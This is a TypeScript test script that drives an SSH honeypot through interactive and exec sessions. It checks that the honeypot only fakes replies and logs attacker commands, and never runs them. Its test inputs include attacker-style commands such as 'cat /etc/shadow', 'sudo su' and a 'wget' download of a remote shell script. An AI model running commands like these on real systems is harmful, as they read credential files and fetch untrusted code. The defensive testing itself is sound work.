/**
 * Verification: drive the honeypot the way a REAL ssh client does, in both
 * modes — interactive PTY shell and non-interactive `ssh host "cmd"`.
 *
 * This is the standing proof of the security invariant: the honeypot records
 * attacker commands and never executes them. It asserts that invariant and
 * exits non-zero when any part fails, so a broken honeypot cannot read as a
 * passing one.
 *
 * Usage: npx tsx scripts/verify-honeypot.ts
 */
import { Client } from "ssh2";
import { existsSync, readFileSync } from "node:fs";

const HOST = process.env.HONEYPOT_HOST ?? "127.0.0.1";
const PORT = Number(process.env.HONEYPOT_PORT ?? 2222);
const LOG = process.env.HONEYPOT_LOG ?? "data/events.jsonl";

/** Payloads that would leave a mark if the honeypot ever really ran them. */
const PAYLOAD_MARKERS = ["/tmp/soc-verify-pwned", "/tmp/evil.sh"];

let failures = 0;
function check(name: string, ok: boolean, detail = "") {
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? ` — ${detail}` : ""}`);
  if (!ok) failures++;
}

/** Interactive: open a shell, type commands, read the faked replies. */
function interactive(user: string, pass: string, cmds: string[]): Promise<string> {
  return new Promise((resolve, reject) => {
    const c = new Client();
    c.on("ready", () => c.shell({ term: "xterm" }, (err, stream) => {
      if (err) return reject(err);
      let out = "";
      stream.on("data", (d: Buffer) => { out += d.toString(); });
      stream.stderr.on("data", (d: Buffer) => { out += d.toString(); });
      let i = 0;
      const next = () => {
        if (i >= cmds.length) { setTimeout(() => { c.end(); resolve(out); }, 300); return; }
        stream.write(cmds[i++] + "\n");
        setTimeout(next, 350);
      };
      setTimeout(next, 400);
    }));
    c.on("error", reject);
    c.connect({ host: HOST, port: PORT, username: user, password: pass, readyTimeout: 8000 });
  });
}

/** Non-interactive: exactly what `ssh -p 2222 root@host "id"` does. */
function execMode(user: string, pass: string, cmd: string): Promise<string> {
  return new Promise((resolve, reject) => {
    const c = new Client();
    c.on("ready", () => c.exec(cmd, (err, stream) => {
      if (err) return reject(err);
      let out = "";
      stream.on("data", (d: Buffer) => { out += d.toString(); });
      stream.stderr.on("data", (d: Buffer) => { out += d.toString(); });
      stream.on("close", () => { c.end(); resolve(out); });
    }));
    c.on("error", reject);
    c.connect({ host: HOST, port: PORT, username: user, password: pass, readyTimeout: 8000 });
  });
}

const t0 = Date.now();

// Record the pre-run log so we only assert on events this run created.
const before = existsSync(LOG)
  ? readFileSync(LOG, "utf8").split("\n").filter((l) => l.trim()).length
  : 0;

console.log(`--- interactive PTY shell (root:hunter2) ---`);
const shellOut = await interactive("root", "hunter2", [
  "whoami", "id", "cat /etc/shadow", "sudo su", "touch /tmp/soc-verify-pwned",
]);
check("interactive shell returns fake output", shellOut.trim().length > 0, `${shellOut.length} chars`);

console.log(`--- non-interactive exec (admin:letmein) ---`);
const out = await execMode("admin", "letmein", "uname -a");
console.log(`  honeypot replied: ${JSON.stringify(out.trim())}`);
check("exec returns canned uname output", /Linux/i.test(out), JSON.stringify(out.trim().slice(0, 60)));

console.log(`--- non-interactive exec with a download attempt ---`);
const out2 = await execMode("admin", "letmein", "wget http://10.0.0.1/x.sh");
console.log(`  honeypot replied: ${JSON.stringify(out2.trim())}`);
check("download attempt gets a canned reply, not a fetch", out2.trim().length > 0);

console.log("\n--- security invariant: nothing was executed ---");
for (const marker of PAYLOAD_MARKERS) {
  check(`${marker} was never created`, !existsSync(marker));
}

// The honeypot writes on session close, and the last exec session closes just
// after the client disconnects. Poll briefly for the records to land rather
// than asserting on a not-yet-flushed file.
async function waitForEvents(minimum: number, timeoutMs = 3000) {
  const deadline = Date.now() + timeoutMs;
  let count = before;
  while (Date.now() < deadline) {
    count = existsSync(LOG)
      ? readFileSync(LOG, "utf8").split("\n").filter((l) => l.trim()).length
      : 0;
    if (count - before >= minimum) return count;
    await new Promise((r) => setTimeout(r, 100));
  }
  return count;
}
const after = await waitForEvents(3);
const wrote = after - before;
check("sessions were recorded", wrote >= 3, `${wrote} new event(s)`);

// The download payload must be recorded verbatim, or capture is broken.
const recent = existsSync(LOG)
  ? readFileSync(LOG, "utf8").split("\n").filter((l) => l.trim()).slice(before)
  : [];
const captured = recent.some((l) => {
  try {
    const cmds = JSON.parse(l).commandsAttempted as string[] | undefined;
    return Array.isArray(cmds) && cmds.some((c) => c.includes("wget"));
  } catch {
    return false;
  }
});
check("the wget payload was captured verbatim", captured);

console.log(`\ndone in ${Date.now() - t0}ms`);
if (failures > 0) {
  console.log(`\nHONEYPOT VERIFICATION: ${failures} FAILURE(S)`);
  process.exit(1);
}
console.log("\nHONEYPOT VERIFICATION: PASS");
process.exit(0);
